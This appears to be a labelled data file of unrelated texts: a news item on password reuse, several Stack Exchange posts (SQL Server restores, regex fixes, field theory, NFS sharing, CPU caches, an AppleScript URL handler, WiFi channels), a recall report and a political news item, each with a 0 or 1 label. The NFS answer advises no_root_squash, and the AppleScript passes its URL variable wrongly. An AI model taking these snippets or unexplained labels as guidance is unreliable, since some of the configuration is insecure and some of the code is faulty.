A total of 27% of Brits of all ages – including over 52% of youths aged 18-25 – reuse their email password for a number of other online accounts, according to a study conducted by the United Kingdom government’s ‘Cyber Aware’ campaign together with Experian.

On the other hand, only 13% of people aged 55 or older were found to be guilty of such password reuse. Of course this might be best explained by the fact that younger people tend to set up more online accounts than their parents or grandparents.

Meanwhile, about 79% of over 2,100 respondents across the generations admitted that they had sent sensitive information such as bank details or copies of passports and driving licenses via email. Two out of three have yet to delete all such information from their inboxes. For one in every two respondents, the bank or credit card information that they have previously sent by email is still sitting among their sent items.

The conclusions of the ‘Cyber Aware’ survey come in the wake of recent findings that online fraud is the most prevalent crime in England and Wales, costing individuals some £10 billion last year alone. Young people were singled out as increasingly likely victims of internet-borne fraud, including because of their penchant for liberal sharing of personal information.

Also, research by Experian last year concluded that older Brits value security over convenience. Thanks to their tendency to use various passwords for different online services, they were found to be generally more prudent in protecting their online lives than their grandchildren.

Young Brits are by no means an outlier as far as poor password habits go. For example, a 2016 survey by the US-based Pew Research Center found that 39% of those quizzed used the same or very similar passwords for many of their online accounts, thus putting themselves at risk of identity theft or fraud.

Want my password? But of course!

Sharing passwords with other people is another common way of courting trouble. For instance, more than four in ten Americans have shared the password to one of their online accounts with a friend or family member, according to the Pew Research Center study.

A LastPass poll in the United States in 2016 found a similar proportion of people sharing not only their passwords to email and communication services, but also passwords for financial services – despite most of them acknowledging that such practice is risky. Only 19% of the respondents claimed that they do not share with other people any login details that would jeopardize their identity or financial information. In general, the younger the people the more likely they were to share their passwords.

Back in the UK recently, several Members of Parliament found nothing strange about sharing their work computer login details with aides and interns, earning a rebuke from the country’s data protection watchdog ICO.",1
"<p>I am attempting to automate restoring .bak files on a secondary database in the case of a primary server failure.  Both servers are SQL server 2014.</p>

<p>Here is a sample SQL script:</p>

<pre><code>USE master
GO

DECLARE @DBName varchar(50)
DECLARE @BackupFile varchar(256)

Set @DBName = 'test-db'
Set @BackupFile = 'D:\MSSQL\Backups\test-db\test-db_backup_2016_03_18_001622_2611392.bak'



-- Find Logical and Physical file names
declare @LogicalDataFile      sysname
        , @LogicalLogFile       sysname
        , @PhysicalDataFile     nvarchar(260)
        , @PhysicalLogFile      nvarchar(260)

-- Data file
select  @LogicalDataFile = name
        , @PhysicalDataFile = physical_name
from    sys.master_files
where   database_id = db_id(@DBName)
        and type_desc = 'ROWS'

-- Log file
select  @LogicalLogFile = name
        , @PhysicalLogFile = physical_name
from    sys.master_files
where   database_id = db_id(@DBName)
        and type_desc = 'LOG'


-- Print variables
Print 'Logical Data File: ' + @LogicalDataFile 
Print 'Logical Log File: ' + @LogicalLogFile
Print 'Physical Data File: ' + @PhysicalDataFile
Print 'Physical Log File: ' + @PhysicalLogFile


-- Set as single user mode
EXEC('ALTER DATABASE [' + @DBName
+ '] SET SINGLE_USER
WITH ROLLBACK IMMEDIATE')


--DB that will be over written
RESTORE DATABASE [@DBName] 
--Restore file with data
FROM DISK = @BackupFile
WITH MOVE @LogicalDataFile TO @PhysicalDataFile,
MOVE @LogicalLogFile TO @PhysicalLogFile,
REPLACE,
STATS=10

-- Return to multi-user mode
EXEC('ALTER DATABASE [' + @DBName 
+ '] SET MULTI_USER')
</code></pre>

<p>When I run the above script I get the following output:</p>

<pre><code>Logical Data File: test-db
Logical Log File: test-db_log
Physical Data File: D:\MSSQL\Data\test-db.mdf
Physical Log File: D:\MSSQL\Data\test-db_log.ldf
Msg 1834, Level 16, State 1, Line 50
The file 'D:\MSSQL\Data\test-db.mdf' cannot be overwritten.  It is being used by database 'test-db'.
Msg 3156, Level 16, State 4, Line 50
File 'test-db' cannot be restored to 'D:\MSSQL\Data\test-db.mdf'. Use WITH MOVE to identify a valid location for the file.
Msg 1834, Level 16, State 1, Line 50
The file 'D:\MSSQL\Data\test-db_log.ldf' cannot be overwritten.  It is being used by database 'test-db'.
Msg 3156, Level 16, State 4, Line 50
File 'test-db_log' cannot be restored to 'D:\MSSQL\Data\test-db_log.ldf'. Use WITH MOVE to identify a valid location for the file.
Msg 3119, Level 16, State 1, Line 50
Problems were identified while planning for the RESTORE statement. Previous messages provide details.
Msg 3013, Level 16, State 1, Line 50
RESTORE DATABASE is terminating abnormally.
</code></pre>

<p>I wanted to make sure that the MOVE statements weren't being ignored for some reason, so I changed the variable names for the logical and physical file names - as expected, I got an error stating that the variables must be declared.</p>

<p>Is there something else that needs to be done to allow the database to be overwritten?  There are no other connections to this database.</p>
",0
"<p>There are several ways in which this bug could be fixed:</p>



<ol>
<li><p>One solution, for modern browsers, would be to add the <code>u</code> flag to the regexp to make it treat surrogate pairs as single characters, but alas, <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp#Browser_compatibility"" rel=""nofollow noreferrer"">browser support for that ES2015 feature</a> may still be insufficient.</p></li>
<li><p>An alternative fix would be to make the regexp explicitly match surrogate pairs, like this:</p>

<pre class=""lang-js prettyprint-override""><code>link = link.replace(/%(?:[\da-fA-F]{2})|[\uD800-\uDBFF][\uDC00-\uDFFF]|[^\w\d-./[\]]/g, function (match) {
</code></pre>

<p>Note that the <code>\?|\+</code> part of the original regexp is redundant, so I've omitted it above.  The surrogate pair pattern must come <em>before</em> the <code>[^\w\d-./[\]]</code> part, so that the regexp engine tries it first.  Alternatively, individual surrogate characters could be completely excluded from the match by changing the last part into <code>[^\w\d\-./[\]\uD800-\uDFFF]</code>.</p></li>
<li><p>An even simpler fix (which would likely also speed up the replacement a little) would be to allow the regexp to match an arbitrary number of non-excluded code units at once, like this:</p>

<pre class=""lang-js prettyprint-override""><code>link = link.replace(/%(?:[\da-fA-F]{2})|[?+]|[^\w\d-./[\]%?+]+/g, function (match) {
</code></pre>

<p>Note that this solution requires explicitly excluding the special characters <code>%</code>, <code>?</code> and <code>+</code> from the last part of the regexp, since the callback code below assumes that those characters will always be matched individually.</p></li>
</ol>

<p>Any of these methods should solve the problem (although, as noted, the first one might not work on all supported browsers yet).  Personally, I'd recommend the last method for its simplicity and efficiency, although it probably needs to be explicitly commented so that future maintainers won't accidentally break it e.g. by removing the <code>+</code>.</p>

<hr>

<p>Ps. My <a href=""https://stackapps.com/questions/4486/the-stack-overflow-unofficial-patch-soup"">SOUP</a> user script currently fixes this issue as a side effect of its workaround for the <a href=""https://meta.stackexchange.com/q/234680"">IDN percent-encoding bug</a>.  The code I'm using in that work-around is basically the same as my third suggestion above, except somewhat simplified (since it's just a pre-processing step before the URL is fed into the actual SE <code>properlyEncoded()</code> function):</p>

<pre class=""lang-js prettyprint-override""><code>// Separate URL and optional title, fix possibly broken % encoding in URL
var m = /^\s*(.*?)(?:\s+""(.*)"")?\s*$/.exec(text);
var url = m[1], title = m[2];
var normalized = url.replace(/%(?:[\da-fA-F]{2})|[^\w\d\-./[\]%?+]+/g, function (match) {
    if (match.length === 3 &amp;&amp; match.charAt(0) == ""%"") return match;
    else return encodeURI(match);
} );
</code></pre>
",0
"<p>As mentioned in my other post, I am attempting to learn from Gross'""<em>Relativistic quantum mechanics and field theory</em>"", and I have a question concerning the manipulation of the antisymmetric 4x4 tensors involved.</p>

<p>There are two points where this does not make sense to me. Firstly, when proving that the correct equations of motion can be derived from the EM Lagrangian density:</p>

<p>$$
    L = -\frac{1}{4} F_{\mu \nu}F^{\mu \nu}-j_\mu A^{\mu}
$$</p>

<p>Gross mentions that the equation can be simplified by expanding it the following way:</p>

<p>$$
    -\frac{1}{4} F_{\mu \nu}F^{\mu \nu} = -\frac{1}{4} (\partial_\mu A_\nu -\partial_\nu A_\mu)(\partial^\mu A^\nu -\partial^\nu A^\mu)
$$
$$
   =-\frac{1}{2} g^{\mu \mu'}g^{\nu \nu'}(\partial_\mu A_\nu\partial_{\mu'} A_{\nu'} -\partial_\mu A_\nu\partial_{\nu'} A_{\mu'})
$$</p>

<p>We then construct the Lagrangian equations of motion, which doesn't bother me. My question is (hopefully) much simpler. No matter how I treat the product shown above I cannot remove the multiple of 2. What 4-vector or metric tensor trickery is happening here? </p>

<p>The best I can do is to operate on all of the contravariant partials and A's with the metric tensor and get the following for the expansion:
$$
    -\frac{1}{4} (\partial_\mu A_\nu -\partial_\nu A_\mu)(\partial^\mu A^\nu -\partial^\nu A^\mu)
$$
$$
   = -\frac{1}{4} g^{\mu \mu'}g^{\nu \nu'}(\partial_\mu A_\nu\partial_{\mu'} A_{\nu'} -\partial_\mu A_\nu\partial_{\nu'} A_{\mu'}-\partial_\nu A_\mu\partial_{\mu'} A_{\nu'}+\partial_\nu A_\mu\partial_{\nu'} A_{\mu'})
$$</p>

<p>I understand from here the argument of cancelling the factor of 2 is as simple as grouping these terms into two distinct factions, but I don't see how one can do so? </p>

<p>I can sort of see how, if $\mu = \mu'$ and $ \nu = \nu'$ how the middle two terms could be reshuffled, ie:
$$
   = -\frac{1}{4} g^{\mu \mu'}g^{\nu \nu'}(\partial_\mu A_\nu\partial_{\mu'} A_{\nu'} -2\partial_\mu A_\nu\partial_{\nu'} A_{\mu'}+\partial_\nu A_\mu\partial_{\nu'} A_{\mu'})
$$</p>

<p>But even if I allow for that, the partials for the last two terms are completely different.</p>

<p>I expect that my misunderstanding here stems from being unfamiliar with 4-vectors. My background is Chemistry and I am just trying to understand some of these deeper concepts.</p>

<p>A similar occurrence happens two pages later, where Gross states that in making the relativistic lagrangian density, we can separate out the scalar potential terms (the time terms in the A 4-vector), by doing:</p>

<p>$$
  L = -\frac{1}{4} F_{\mu \nu}F^{\mu \nu}-j_\mu A^{\mu}
$$ 
$$
  = -\frac{1}{2} \partial_\mu A^0(\partial^\mu A^0 -\partial^0 A^\mu)+\frac{1}{2} \partial_\mu A^i(\partial^\mu A^i -\bigtriangledown_i A^\mu) - \rho A^0 + j \cdot A
$$
Where $\rho$ and $A^0$ are the time terms for the j and A 4-vectors, respectively.</p>

<p>Similarly, I don't know how the $-\frac{1}{4}$ term can be broken up here either. I know that this is something dead simple, but I'm stuck and I'd appreciate any help. </p>
",0
"<p>I claim there is no true, objective difference between a property and a definition. Part of creating mathematics is deciding what are properties that need to be proven from definitions versus what are instead <em>defining</em> properties. Often there are <em>morally correct</em> definitions: those that get the greatest traction in the begining, or the greatest mileage in the end, or are the most aesthetically elegant, or are the most suggestive and illuminating as to their purpose and discovery, or mimic our intuition closest, or have other desirable properties. I am a moral relativist, though, believing that which definition of something is best (even ""morally correct"") can depend on context.</p>

<p>On the one hand, it would be nice if every concept had a single definition, and every other property was derivative - this would make learning much more straightforward. But when there is no universally best definition (just look up ""Prufer domain""), it is a disservice to other definitions to pick just one for everybody; furthermore, the ability to convert between definitions is indicative of a fuller understanding of all of the properties related to a given concept. Indeed, being able to think about a concept from multiple points of view is extremely useful in practice - then <em>all</em> of the basic properties feel ""defining"" and are more memorable. Showing that different definitions are equivalent, and then being able to feel that their equivalence is ""obvious,"" is a rite of passage.</p>

<p>Thus I am forced to reject the premise of this question. Being exposed to multiple definitions of things is good for learning math, and having multiple definitions is healthy for the whole enterprise of doing math. In any case, no book of definitions can change the fact that multiple definitions exist out there in the world and are in wide usage by different people and sources.</p>

<p>You might, though, find some definitions hard to understand, or hard to see the motivation of, or hard to see how to use, at least at first. To this end I can recommend <em>shopping</em>: shop for the ""right"" definitions of concepts for <em>you</em>, the ones that are the most accessible or intuitive. I do this all the time, which is why I am rarely satisfied with reading just one source (I go shopping for more than just definitions, though). Your preferences may differ from that of others, but a good heuristic is that the more basic or introductory texts will have definitions that are easier to get a foothold with, and you want to learn these first.</p>

<p>For abstract algebra, the text I used in my educational track was Gallian's <em>Contemporary Abstract Algebra</em>, covering groups, rings and fields, which was chosen for simplicity. I don't think it covers algebras (the ones over scalars) or free groups. There are a number of good sources online that can be found through googling, though. The shopping you'll have to do on your own, or ask as a separate question (although asking for introductory texts has been done enough times on MSE).</p>
",0
"<p>Use NFS to share file between systems if there is no windows involved, it is so easy.</p>

<p>Install <a href=""https://apps.ubuntu.com/cat/applications/nfs-kernel-server"" rel=""noreferrer"">nfs-kernel-server <img src=""https://hostmar.co/software-small"" alt=""Install nfs-kernel-server""></a> and <a href=""https://apps.ubuntu.com/cat/applications/nfs-common"" rel=""noreferrer"">nfs-common <img src=""https://hostmar.co/software-small"" alt=""Install nfs-common""></a> on the computer that has the files to be shared. These can be installed in the Software Center, or however you prefer to install packages. You can install them on the command-line with:</p>

<pre><code>sudo apt-get update &amp;&amp; sudo apt-get install nfs-kernel-server nfs-common
</code></pre>

<p>You need to edit the exports file that shows what to share and with whom. So run:</p>

<pre><code>gksu gedit /etc/exports
</code></pre>

<p>For example, to give full read and write permissions, allowing any computer from 192.168.1.1 through 192.168.1.255, add this line to <code>/etc/exports</code>:</p>

<pre><code>/directory_to_share 192.168.1.1/24(rw,no_root_squash,async)
</code></pre>

<p>My daughter's export file looks like this (I am <code>.201</code>--we are not using a range, just one IP):</p>

<pre><code>/home           192.168.0.201(rw,sync,no_root_squash,no_subtree_check)
/srv/nfs        192.168.0.201(rw,sync,no_subtree_check)
</code></pre>

<p>Restart the NFS server by running:</p>

<pre><code>sudo /etc/init.d/nfs-kernel-server restart
</code></pre>

<p>(Or just reboot the computer.)</p>

<p>From now on after editing the <code>/etc/exports</code> file, you can just run <code>sudo exportfs -a</code> to apply the changes.</p>

<p>The <a href=""http://manpages.ubuntu.com/manpages/precise/en/man8/showmount.8.html"" rel=""noreferrer""><code>showmount</code></a> cmommand will tell you that all went well--for example, on my daughter's computer, it shows she will share these two things with my computer @ .201 (me) if requested</p>

<pre><code>$ showmount -e
Export list for jamie-desktop:
/srv/nfs 192.168.0.201
/home    192.168.0.201
</code></pre>

<p>Then install <a href=""https://apps.ubuntu.com/cat/applications/nfs-common"" rel=""noreferrer"">nfs-common <img src=""https://hostmar.co/software-small"" alt=""Install nfs-common""></a> on the computer that wants to mount the export shares as part of its file system. </p>

<p>An <a href=""http://manpages.ubuntu.com/manpages/precise/en/man5/fstab.5.html"" rel=""noreferrer""><code>fstab</code></a> entry must be added to have your computers nfs-client mount another computers exports @ boot time. <code>gksu gedit /etc/fstab</code> will edit the required file.</p>

<pre><code> 192.168.0.200:/srv/nfs  /media  nfs  rsize=8192 and wsize=8192,noexec,nosuid
</code></pre>

<p>Reboot and the share is mounted in <code>/media</code>.</p>

<p>Set up a server on the client and client on the server for two-way shares.</p>

<p>You can print to a shared printer with CUPS (as mentioned in <a href=""https://askubuntu.com/a/8540/22949"">this answer</a>).</p>
",0
" (CNN) Publix and Chocolate Shoppe Ice Cream Co. have joined the growing list of recalls linked to Aspen Hills Inc. cookie dough.  Publix issued a recall this week of its chocolate chip cookie dough ice cream sold at stores in Florida, Georgia, Alabama, Tennessee and North and South Carolina. The packages have a sell by date of May 27, 2017, and the UPC code   .  Similarly, Chocolate Shoppe Ice Cream Co. Inc. announced the recall of more than 4, 000 gallon cartons, more than 5, 000 pints and some   cartons of its cookie dough, Heaps of Love, peanut butter cookie dough, Sticks  Stones and Yippee Skippee flavors. It is also recalling   cartons of its Baked Bear cookie dough ice cream.  The products contain cookie dough supplied by Aspen Hills, which first announced last month that its   chocolate chip cookie dough might be contaminated with listeria. This prompted Blue Bell Ice cream to issue a recall, which it expanded this week.  Since then, Blue Bunny issued its own recall of Hoppin’ Holidoodle for the same reason. All of the companies have stated that no consumers have fallen ill. These products were distributed in a number of states, all of which are listed on the FDA website. ”We are acting out of an abundance of caution because a thorough review of our manufacturing environment has revealed instances where we may not have met our food safety standards,” said Jon Austin, a spokesman for Aspen Hills. ”Our lab results for all of our products are negative.” The same concern reached to an energy bar, as well. On Tuesday, Nutrisystem voluntarily recalled its Nutricrush Chocolate Chip Cookie Dough bar based on listeria concerns raised by an unnamed vendor supplying its chocolate chip cookie dough. The product had been distributed to ShopRite and Hannaford stores in Connecticut, Delaware, Massachusetts, Maryland, Maine, New Hampshire, New Jersey, New York, Pennsylvania, Rhode Island, Virginia and Vermont and online through Amazon. com and Walmart. com. Again, no illnesses have been reported. The list of recalled products may continue to grow as companies discover additional products that contain Aspen Hill cookie dough. Listeria monocytogenes may cause serious and even fatal infections, according to the Centers for Disease Control and Prevention: about 1, 600 illnesses and 260 deaths are caused by listeria annually in the United States. Otherwise healthy individuals may suffer only   symptoms, such as high fever, severe headache, stiffness, nausea, abdominal pain and diarrhea. However, a listeria infection can cause miscarriages and stillbirths among pregnant women and may become serious for young children, frail or elderly people, and others with weakened immune systems.  Last week, Nestle USA Inc. issued an unrelated recall of its Drumstick Club 16 count variety pack and 24 count vanilla pack after receiving positive test results for listeria from equipment involved in the production of these ice cream novelties. The products have been distributed nationally, but no illnesses have been reported, the company said.",0
"SiriusXM hosts Stephen K. Bannon and David Webb announced on Breitbart News Daily that SiriusXM has suspended Glenn Beck and Webb will temporarily take over Beck’s 9AM to noon Eastern time slot on SiriusXM’s Patriot Channel 125. [SiriusXM issued the following statement:  SiriusXM encourages a diversity of discourse and opinion on our talk programs. However, comments recently made by a guest on the independently produced Glenn Beck Program, in our judgement, may be reasonably construed by some to have been advocating harm against an individual currently running for office, which we cannot and will not condone. For that reason, we have suspended The Glenn Beck Program from our Patriot channel for the coming week and are evaluating its place in our lineup going forward. SiriusXM is committed to a spirited, robust, yet responsible political conversation and believes this action reflects those values. The suspension is in response to the interview Beck did with fiction author Brad Thor last Wednesday, in which Thor likened the GOP’s presumptive nominee Donald Trump to a South   dictator who would cause an “  event” for the country if elected. Thor then declared that in such a case, Congress would not be able to remove Trump from office by “legal means” through impeachment, so Thor asked “what patriot will step up and do that” if Trump oversteps his Constitutional restraints. Beck agreed with Thor’s assessment. Here is the exchange: THOR: He is a danger to America and I got to ask you a question and this is serious and this could ring down incredible heat on me because I’m about to suggest something very bad. It is a hypothetical I am going to ask as a thriller writer. With the feckless, spineless Congress we have, who will stand in the way of Donald Trump overstepping his constitutional authority as President? If Congress won’t remove him from office, what patriot will step up and do that if, if, he oversteps his mandate as president, his   authority, I should say, as president. If he oversteps that, how do we get him out of office? And I don’t think there is a legal means available. I think it will be a terrible, terrible position the American people will be in to get Trump out of office because you won’t be able to do it through Congress. BECK: I would agree with you on that and I don’t think you actually have the voices we’ve been talking about and we’ve been talking about this   for a while. I think the voices like ours go away. I don’t think we are allowed  —   especially if things, and I believe the economy is going to go to crap, even if Jesus was in office. It’s going to naturally reset. It has to. Read the rest of the exchange here. After receiving criticism for these comments from people who believed Thor and Beck were suggesting or at least implying assassination, Beck offered a lengthy defense of his statements. You can read the full transcript of his defense here. Listen to Bannon and Webb’s announcement of the suspension below: Breitbart News Daily airs on SiriusXM Patriot 125 weekdays from 6AM to 9AM Eastern.",0
"<p>Yes there will be a (marginal) impact on performance, but if it's for debugging purposes I don't think you'll be able to tell the difference.</p>

<p>You can easily test this yourself on your data by adding statistics IO and looking at the query plans</p>

<p>Take this code for example:</p>

<pre><code>SET STATISTICS time ON;
SET STATISTICS IO ON;

WITH randowvalues
    AS(
       SELECT 1 id, CAST(RAND(CHECKSUM(NEWID()))*100 AS int) randomnumber
        UNION  ALL
        SELECT id + 1, CAST(RAND(CHECKSUM(NEWID()))*100 AS int)  randomnumber
        FROM randowvalues
        WHERE 
          id &lt; 1000
      )



SELECT *
INTO sample 
FROM randowvalues
OPTION(MAXRECURSION 0)

GO

DECLARE @VAR AS INT

SET @VAR = 500    

SELECT * FROM sample WHERE ID &gt; @VAR

CREATE TABLE #cut ( ID int )

INSERT INTO #cut VALUES (500)

SELECT * FROM sample A INNER JOIN #CUT B ON A.ID &gt; B.ID
</code></pre>

<p>You will notice that in the <a href=""https://www.brentozar.com/pastetheplan/?id=rksJbnfUm"" rel=""nofollow noreferrer"">execution plan</a> that the first query does a simple table scan for an estimated cost of 0.005.</p>

<p>For the second construction you'll see that the plan for the insert has an estimated cost of around 0.01, and the query itself added an extra table scan (for your temporary table) and a nested loops join to combine data from both tables.<br>
The estimated cost for this select is also around 0.01.</p>

<p>The output for the IO statistics for the first select is: </p>

<blockquote>
  <p>Table 'sample'. Scan count 1, logical reads 3, physical reads 0,
  read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob
  read-ahead reads 0.</p>
</blockquote>

<p>So this query does 3 reads.</p>

<p>The output for the insert and the select with the join is this:</p>

<blockquote>
  <p>Table '#cut'. Scan count 0, logical reads 1, physical reads 0,
  read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob
  read-ahead reads 0.  </p>
  
  <p>Table 'sample'. Scan count 1, logical reads 3, physical reads 0,
  read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob
  read-ahead reads 0. Table '#cut'. Scan count 1, logical reads 1,
  physical reads 0, read-ahead reads 0, lob logical reads 0, lob
  physical reads 0, lob read-ahead reads 0.</p>
</blockquote>

<p>So if you add that up the second construct with the join does a bit more IO.</p>

<p>Creating a clustered index on the ID column replaces the table scan with a clustered index seek as can be seen in <a href=""https://www.brentozar.com/pastetheplan/?id=Hk0VZ2GIQ"" rel=""nofollow noreferrer"">this plan</a> or creating a nonclustered index on ID results in <a href=""https://www.brentozar.com/pastetheplan/?id=S1AiZ2MLQ"" rel=""nofollow noreferrer"">this plan</a>.</p>

<p>Even though the impact in your situation can vary depending on your actual data and table structure, your construction with a temporary table will always add <em>some</em> IO, a second table access and a join operator which will impact performance negatively (maybe marginally).</p>
",0
"<p>Apparently the <a href=""http://en.wikipedia.org/wiki/ILLIAC_II"" rel=""nofollow"">ILLIAC II</a> had a single/unified cache (called a ""fast buffer"") and a primitive 3-stage pipeline. It looks like pretty much every (pipelined) processor thereafter had split (first level) caches, as long as it had caches. L2, L3+ caches are usually unified though.</p>

<p>There have also been some recent proposals for unified first level cache, e.g. from Intel Spain labs (which I didn't even know existed): ""<a href=""http://www.des.udc.es/~basilio/papers/Rolan13-VSC.pdf"" rel=""nofollow"">Virtually Split Cache: An Efficient Mechanism to Distribute Instructions and Data""</a> (TACO 2013). The main downside is complexity if you want to preserve good throughput. The reasons for the split L1 cache status quo are explained in the paper as:</p>

<blockquote>
  <p>While unified approaches usually provide higher hit rates by automatically sharing resources instead of statically partitioning them, split [L1] caches are the preferred configuration, mainly because of the following reasons:</p>
  
  <ul>
  <li><p>Different instructions can access the instruction cache, in the fetch stage of the
  pipeline, and the data cache, usually in the memory stage, at the same time in
  pipelined processors. Unified approaches would require several access ports and,
  thus, more complexity to provide the same advantages.</p></li>
  <li><p>The instruction cache design may be simpler, as it only needs to perform, ideally,
  read operations.</p></li>
  <li><p>Unified caches of the same aggregated capacity imply higher latencies.</p></li>
  </ul>
</blockquote>

<p>Their ""virtually split cache"" proposal is somewhere in between as the cache cells are unified but there are two sets of tags and indices and independent ports.</p>

<p>Also note that the dichotomy between Harvard and von Neumann is not that sharp in practice as most general purpose current processors (using a split L1 cache but unified lower levels of memory) are of the so-called <a href=""https://books.google.com/books?id=jKOsdJ8Rk6EC&amp;pg=PA5"" rel=""nofollow"">""modified Harvard architecture""</a>, which is a combination of the best of both worlds. As I said in a comment above, the terminology ""modified Harvard architecture"" is somewhat arbitrary given that it applies to a hybrid; you might as well decide to call it ""modified von Neumann architecture"", it's just that the former has been the established term of art. Furthermore, different authors may mean different things by ""modified Harvard architecture""; it could mean that the memory is unified and caches are [mostly] transparent so the memory as a whole appears to the programmer as in the von Neumann model, or it could also mean a weaker model in which there are different address spaces for data and programs but there are operations to copy between these; see slide 8 in <a href=""http://www.sonoma.edu/users/f/farahman/sonoma/courses/es310/lectures/chapter2_.pdf"" rel=""nofollow"">this presentation</a>, which is one of the comprehensive ones on this topic.</p>
",0
"<p>Protocol handlers are registered with OS X in application bundles (specifically, in the info.plist file in the bundle's <code>Contents</code> directory). This should be done by the application that supports it. In other words, you should be able to straight-up run the second command and have it open DEVONthink. Based on <a href=""http://www.organognosi.com/its-all-about-hyperlinks/"" rel=""noreferrer"">this page</a> it sounds like that's how it works, but you say it doesn't, so there's a relatively easy way to do it for any program.</p>

<p>If not, or if you just want to register your own handler, here are some steps (modified from <a href=""https://support.shotgunsoftware.com/hc/en-us/community/posts/209485898-Launching-External-Applications-using-Custom-Protocols-under-OSX"" rel=""noreferrer"">Launching External Applications using Custom Protocols under OSX</a>).</p>

<p>Create an AppleScript file that contains the following.</p>

<pre><code>on open location this_URL
    do shell script ""open -a 'Applications/DEVONthink Pro.app' this_URL""
end open location
</code></pre>

<p>On the second line, you are defining what should happen when your protocol is called. <code>this_URL</code> will be the full URL entered (on the command line or elsewhere), including the protocol. In your case, you want to pass the whole URL including <code>x-devonthink-item</code> into DEVONthink. If you were creating your own protocol, you might only want to pass part of the string, so keep that in mind.</p>

<p>Save the AppleScript as an Application bundle. Once saved, find it on disk, right-click on it, and choose Show Package Contents. Inside the Contents folder there will be a file called info.plist. Open this in a text editor (<em>not</em> TextEdit, as it will almost certainly screw up the file format).</p>

<p>At the bottom of the file will be</p>

<pre><code>&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>

<p>Directly above this, add the following:</p>

<pre><code>    &lt;key&gt;CFBundleIdentifier&lt;/key&gt;
    &lt;string&gt;org.personal.dttrick&lt;/string&gt;
    &lt;key&gt;CFBundleURLTypes&lt;/key&gt;
    &lt;array&gt;
        &lt;dict&gt;
            &lt;key&gt;CFBundleURLName&lt;/key&gt;
            &lt;string&gt;Pass To DEVONthink&lt;/string&gt;
            &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;
            &lt;array&gt;
                &lt;string&gt;x-devonthink-item&lt;/string&gt;
            &lt;/array&gt;
        &lt;/dict&gt;
    &lt;/array&gt;
</code></pre>

<p>Save and double-click on your app. Nothing should happen, and that's fine - but in the background, it's registered the protocol with the OS.</p>

<p>Finally, back in Terminal, run your desired command:</p>

<pre><code>open ""x-devonthink-item://2AD2E3D2-58B5-455F-99D4-C91D68C5F959""
</code></pre>

<p>DEVONthink should open with the specified item. I don't have DEVONthink and couldn't test it; I am relying on the command you originally provided as working. If not, you'll need to modify the shell script in the AppleScript to reflect what the actual command needs to be.</p>
",0
"<p>I'm unable to see WiFi networks with channels above 11, despite having set my regulatory region to one in which channels 12 and 13 are allowed.</p>

<p>I followed the advice in the question '<a href=""https://askubuntu.com/questions/59310/how-to-use-wi-fi-channels-above-11"">How to use Wi-Fi channels above 11?</a>' and set added a module parameter for my region. I have verified that the parameter has been accepted:</p>

<pre><code>&gt; cat /sys/module/cfg80211/parameters/ieee80211_regdom
ES

&gt; iw reg get
country ES:
    (2402 - 2482 @ 40), (N/A, 20)
    (5170 - 5250 @ 40), (N/A, 20)
    (5250 - 5330 @ 40), (N/A, 20), DFS
    (5490 - 5710 @ 40), (N/A, 27), DFS
</code></pre>

<p>Yet still Wifi networks above 11 are not visible.</p>

<p>I'm running Ubuntu 12.04 on a Dell Precision M6300 which has a Broadcom BCM4312 Wifi adapter. I can connect to Wifi networks on channel 12 using another OS on the same computer, so the problem is not with the hardware.</p>

<p>I have two other machines running Ubuntu which can see networks on channels above 11 with the default regulatory settings as below. The problem machine also has these settings by default yet they do not allow it to see channels 11 and 12.</p>

<pre><code>&gt; cat /sys/module/cfg80211/parameters/ieee80211_regdom
00

&gt; iw reg get
country 00:
    (2402 - 2472 @ 40), (3, 20)
    (2457 - 2482 @ 40), (3, 20), PASSIVE-SCAN, NO-IBSS
    (2474 - 2494 @ 20), (3, 20), NO-OFDM, PASSIVE-SCAN, NO-IBSS
    (5170 - 5250 @ 40), (3, 20), PASSIVE-SCAN, NO-IBSS
    (5735 - 5835 @ 40), (3, 20), PASSIVE-SCAN, NO-IBSS
</code></pre>

<p>I'm not sure whether it's relevant, but regardless of the module parameter, running <code>crda</code> on all three machine reports:</p>

<pre><code>COUNTRY environment variable not set.
</code></pre>

<p>What else can I try to allow the machine to see networks on channels 12 and 13?</p>

<p><strong>Edit</strong></p>

<pre><code>&gt; sudo iwlist eth2 chan
eth2      32 channels in total; available frequencies :
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          Channel 05 : 2.432 GHz
          Channel 06 : 2.437 GHz
          Channel 07 : 2.442 GHz
          Channel 08 : 2.447 GHz
          Channel 09 : 2.452 GHz
          Channel 10 : 2.457 GHz
          Channel 11 : 2.462 GHz
          Channel 12 : 2.467 GHz
          Channel 13 : 2.472 GHz
          Channel 36 : 5.18 GHz
          Channel 38 : 5.19 GHz
          Channel 40 : 5.2 GHz
          Channel 42 : 5.21 GHz
          Channel 44 : 5.22 GHz
          Channel 46 : 5.23 GHz
          Channel 48 : 5.24 GHz
          Channel 52 : 5.26 GHz
          Channel 56 : 5.28 GHz
          Channel 60 : 5.3 GHz
          Channel 64 : 5.32 GHz
          Channel 100 : 5.5 GHz
          Channel 104 : 5.52 GHz
          Channel 108 : 5.54 GHz
          Channel 112 : 5.56 GHz
          Channel 116 : 5.58 GHz
          Channel 120 : 5.6 GHz
          Channel 124 : 5.62 GHz
          Channel 128 : 5.64 GHz
</code></pre>
",0
"<p>Ignore my previous answer. There are flaws, but I think it's worthwhile leaving it up as it has some valuable ideas. I can now prove that you can embed the metric from a weighted cycle into $L_1$. We will do this in multiple parts. </p>

